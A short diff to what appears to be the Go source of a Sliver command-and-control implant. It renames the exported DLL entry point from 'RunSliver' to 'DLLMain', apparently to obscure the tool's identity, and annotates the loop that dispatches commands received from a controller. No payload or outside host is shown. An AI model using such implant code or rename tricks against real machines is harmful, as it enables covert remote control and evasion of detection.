@@ -30,9 +30,9 @@ import (
 
 // {{if .IsSharedLib}}
 
-// RunSliver - Export for shared lib build
-//export RunSliver
-func RunSliver() {
+// DLLMain - Export for shared lib build
+//export DLLMain
+func DLLMain() {
 	main()
 }
 
@@ -79,7 +79,7 @@ func mainLoop(connection *transports.Connection) {
 
 	for envelope := range connection.Recv {
 		if handler, ok := specialHandlers[envelope.Type]; ok {
-			handler(envelope.Data, connection)
+			handler(envelope.Data, connection) // Special handlers block
 		} else if handler, ok := sysHandlers[envelope.Type]; ok {
 			// {{if .Debug}}
 			log.Printf("[recv] sysHandler %d", envelope.Type)
